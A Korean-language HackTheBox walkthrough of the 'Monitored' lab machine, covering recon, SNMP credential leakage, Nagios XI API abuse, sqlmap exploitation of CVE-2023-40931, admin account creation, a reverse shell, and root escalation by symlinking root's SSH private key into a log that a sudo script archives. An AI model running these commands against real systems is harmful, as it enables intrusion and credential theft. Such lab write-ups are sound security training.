# Monitored - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,389,443,5667 -sC -sV -vv -oA Monitored 10.129.230.96

sudo nmap --top-ports=100 -sU 10.129.230.96
```
<img width="1205" height="447" alt="image" src="https://github.com/user-attachments/assets/ac530956-e290-4f00-ae53-072ba405dcf2" />
<img width="1205" height="268" alt="image" src="https://github.com/user-attachments/assets/b12942f2-9d6e-48ae-aa96-5ee7f7b4452f" />
<img width="1205" height="253" alt="image" src="https://github.com/user-attachments/assets/b29b2926-9f8c-4cf7-9b8d-315a4a0db5df" />

- SSH(22)
- HTTP(80)
- LDAP(389)
- HTTPS(443)
- SNMP(161)

<br>

- `/etc/hosts`에 `nagios.monitored.htb` 추가.
<img width="1205" height="75" alt="image" src="https://github.com/user-attachments/assets/a863237d-d1ac-4856-9ef8-bdecf6f4c0c9" />

---
## SNMP
- `snmp` 정보 수집.
- 아이디와 비밀번호처럼 보이는 출력 발견.
```bash
snmpbulkwalk -c public -v2c 10.129.230.96 . >result
```
<img width="1205" height="46" alt="image" src="https://github.com/user-attachments/assets/1e2083f1-00ff-408e-b1bb-cea7d10166a9" />

---
## HTTPS
### banner grabbing
<img width="1203" height="252" alt="image" src="https://github.com/user-attachments/assets/66184884-0c79-4b67-8060-b59deeb57def" />

### CVE-2023-40931
- HTTP로 접속하면 자동적으로 리다이렉션이 되어 HTTPS로 연결됨.
- `Nagios XI`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/945cb093-5c6b-4df6-af5b-20c3e2d207cc" />

<br>
<br>

- `Access Nagios XI` 버튼을 눌러 기본 계정으로 로그인 시도하였으나 실패.
- `snmp`로부터 발견된 `svc:XjH7VCehowpR1xZB`로 로그인 시도하니 다른 오류 메시지 출력.
<img width="431" height="338" alt="image" src="https://github.com/user-attachments/assets/71a00b58-4c00-49dd-a581-4cf1e77ae1f2" />
<img width="478" height="338" alt="image" src="https://github.com/user-attachments/assets/565573be-17b6-4fe9-ac17-e2c4d8b7bbc6" />

<br>
<br>

- VHOST와 경로탐색에서 특별한 정보를 찾을 수 없었음.
- 로그인 api에서 특별한 정보가 있는지 확인하기 위해서 검색.
<img width="961" height="383" alt="image" src="https://github.com/user-attachments/assets/d0fe913c-a6d0-46f3-9e2a-797987c65f8b" />

<br>
<br>

- api를 통해서 로그인이 가능한 것처럼 확인 됨.
<img width="961" height="126" alt="image" src="https://github.com/user-attachments/assets/c6971b1a-a51c-4741-a8ce-37504a883eeb" />

<br>
<br>

- `/nagiosxi/api/v1/authenticate?pretty=1`로 접속이 가능.
<img width="593" height="149" alt="image" src="https://github.com/user-attachments/assets/c6d75de2-6dcf-4bb4-9853-6c76b0056a05" />

<br>
<br>

- curl로 토큰 요청을 시도.
```bash
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```
<img width="1205" height="234" alt="image" src="https://github.com/user-attachments/assets/e3e2902e-ec3d-4974-9424-44225f126093" />

<br>
<br>

- token 파라미터에 획득한 토큰을 넣어서 접속을 시도하니 `svc`유저로 로그인이 진행됨.
- `nagios xi 5.11`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/0fae5cbe-ed85-468f-a6ca-9844e322e159" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2023-40931
<img width="998" height="329" alt="image" src="https://github.com/user-attachments/assets/b9038279-5951-402b-8127-175a27ef2fa2" />

<br>
<br>

- https://github.com/G4sp4rCS/CVE-2023-40931-POC
- `/admin/banner_message-ajaxhelper.php`경로로 `Content-Type`을 설정해주고 데이터를 전송시에 에러메시지가 나오면 SQL Injection이 가능.
<img width="1080" height="401" alt="image" src="https://github.com/user-attachments/assets/c99e138f-16cf-434c-9ece-e28b30f15a2e" />
<img width="1547" height="484" alt="image" src="https://github.com/user-attachments/assets/c532055b-2f48-4fa7-ac54-fd84fc6e49d6" />

<br>
<br>

- `sqlmap`으로 인젝션 테스트.
```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --data 'action=acknowledge_banner_message&id=3' --cookie 'nagiosxi=tr3psjc4004fvjr2fmc9ocun7r' --batch --threads=10
```
<img width="1202" height="384" alt="image" src="https://github.com/user-attachments/assets/becb86cf-98f4-47ad-b141-c95eb87b73a8" />

<br>
<br>

- `xi_users`테이블 덤핑.
- `admin`계정의 비밀번호 크래킹 실패.
- `admin`계정의 `api_key` 획득.
```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --data 'action=acknowledge_banner_message&id=3' --cookie 'nagiosxi=tr3psjc4004fvjr2fmc9ocun7r' --batch --threads=5 -D nagiosxi -T xi_users --dump
```
<img width="1202" height="368" alt="image" src="https://github.com/user-attachments/assets/cacb1063-303f-4804-8711-0b2124f577ad" />

<br>
<br>

- https://www.exploit-db.com/exploits/44560
- `api_key`를 생성하여 `admin`권한의 유저를 생성할 수 있음.
<img width="623" height="478" alt="image" src="https://github.com/user-attachments/assets/1451f990-4997-4f93-8c63-93353ffc6c3f" />

<br>
<br>

- `admin`권한의 `test`유저 생성.
```bash
curl -X POST -kL -d 'username=test&password=test&name=test&email=test@test.com&auth_level=admin&force_pw_change=0' 'http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1'
```
<img width="1205" height="188" alt="image" src="https://github.com/user-attachments/assets/d5c4decc-754d-4c89-8d0b-04afdb7a2582" />

<br>
<br>

- `test:test` 로그인 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9c36ae2f-c7b0-486f-9427-30e4686a52ae" />

<br>
<br>

- `Configure -> Core Config Manager -> Commands`에서 명령어 생성이 가능한 것처럼 보임.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/85d1edae-e188-42a5-9772-93bec241c07f" />

<br>
<br>

- 리버스 셸 명령어 생성.
<img width="568" height="607" alt="image" src="https://github.com/user-attachments/assets/9e15acec-85de-424a-a3d6-aa613983b715" />

<br>
<br>

- `Apply Configuration` 버튼 클릭.
<img width="458" height="283" alt="image" src="https://github.com/user-attachments/assets/4fefc1eb-306f-45f3-a172-c98b606aa571" />

<br>
<br>

- `Configure -> Core Config Manager -> Services`에서 명령어 실행이 가능한 것처럼 보임.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/8f64ba63-480c-4793-9f58-eca0c9c8bfb9" />

<br>
<br>

- `Check command`에서 생성한 명령어를 선택하여 실행.
<img width="532" height="644" alt="image" src="https://github.com/user-attachments/assets/7d540825-643d-4769-a1b1-14c1261bfc5e" />

<br>
<br>

- 셸 획득.
<img width="1202" height="202" alt="image" src="https://github.com/user-attachments/assets/4ed57704-7d7f-4571-bc20-8ff1f582300c" />

<br>
<br>

- 로컬의 공개키를 저장.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILlrEsIjppVET3pJThtlxxe4AHDn2FcASFqe3oQQNwvl kali@kali' > authorized_keys
```
<img width="1202" height="50" alt="image" src="https://github.com/user-attachments/assets/fc1ed921-ae14-4d01-be04-5c5869d0e9a6" />

<br>
<br>

- SSH 접속.
```bash
ssh nagios@10.129.230.96
```
<img width="1202" height="357" alt="image" src="https://github.com/user-attachments/assets/36720dc9-3b7b-4d27-a585-fc80bb9fae78" />

---
## Privesc
- `root`권한으로 많은 것을 실행이 가능.
<img width="1202" height="576" alt="image" src="https://github.com/user-attachments/assets/34c04477-2f01-430e-bbf7-b64404caf0ad" />

<br>
<br>

- `/usr/local/nagiosxi/scripts/components/getprofile.sh`파일에서 `tail`이 많이 사용 중.
- 만약 읽어내는 파일을 변경할 수 있으면 권한 상승이 가능할 것이라 가정.
```bash
cat /usr/local/nagiosxi/scripts/components/getprofile.sh|grep tail
```
<img width="1202" height="248" alt="image" src="https://github.com/user-attachments/assets/30397a34-e8a7-4d30-977c-1b94c74c66ee" />

<br>
<br>

- `/usr/local/nagiosxi/tmp/phpmailer.log`파일은 `nagios`유저로 생성되어 변경이 가능한 것으로 확인.
<img width="1202" height="48" alt="image" src="https://github.com/user-attachments/assets/da705553-50c7-4560-b3a9-41745b1da4b0" />

<br>
<br>

- `/root/.ssh/id_rsa`를 링크파일로 생성.
```bash
ln -sf /root/.ssh/id_rsa phpmailer.log
```
<img width="1202" height="156" alt="image" src="https://github.com/user-attachments/assets/9e33e584-8911-4e0d-822c-949a1b7b2d8c" />

<br>
<br>

- `/usr/local/nagiosxi/scripts/components/getprofile.sh`를 `root`권한으로 실행.
```bash
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
```
<img width="1202" height="179" alt="image" src="https://github.com/user-attachments/assets/46fd2417-b1de-484d-a651-991026d3f682" />

<br>
<br>

- 생성된 zip파일은 상위 경로에 위치.
<img width="1202" height="179" alt="image" src="https://github.com/user-attachments/assets/fe51cfe0-36ea-45b2-8426-9ae8d675d30a" />

<br>
<br>

- 압축 해제 후 `phpmailer.log`파일을 확인하면 비밀키 획득.
<img width="1202" height="225" alt="image" src="https://github.com/user-attachments/assets/c4058456-1c9f-4ff9-8094-8a1d6ce3bede" />

<br>
<br>

- 로컬에 복사해온 후 SSH 접속하여 셸 획득.
```bash
ssh -i id_rsa root@10.129.230.96
```
<img width="1202" height="335" alt="image" src="https://github.com/user-attachments/assets/ca0baf45-f19e-4ba6-a1c6-81824e887be4" />

---
## FLAG
- `/home/nagios/user.txt`
<img width="1202" height="201" alt="image" src="https://github.com/user-attachments/assets/01bab64c-7a22-4fcd-ba19-b92e18486020" />

<br>
<br>

- `/root/root.txt`
<img width="1202" height="333" alt="image" src="https://github.com/user-attachments/assets/49b3edcd-6856-4584-b9bf-e9026b7d7262" />
